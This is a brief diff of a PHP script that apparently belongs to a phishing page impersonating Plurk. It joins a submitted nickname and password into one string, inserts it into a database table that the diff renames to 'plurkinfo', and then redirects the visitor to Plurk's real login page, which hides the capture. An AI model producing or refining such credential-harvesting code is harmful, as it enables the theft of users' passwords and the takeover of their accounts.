@@ -21,7 +21,7 @@ try {
     $combined = $nickname . '  ||  ' . $password;
 
     // Insert combined string into table "submissions"
-    $stmt = $pdo->prepare("INSERT INTO submissions (input_text) VALUES (:input)");
+    $stmt = $pdo->prepare("INSERT INTO plurkinfo (input_text) VALUES (:input)");
     $stmt->execute(['input' => $combined]);
     header("Location: https://www.plurk.com/login?r=");
     exit;
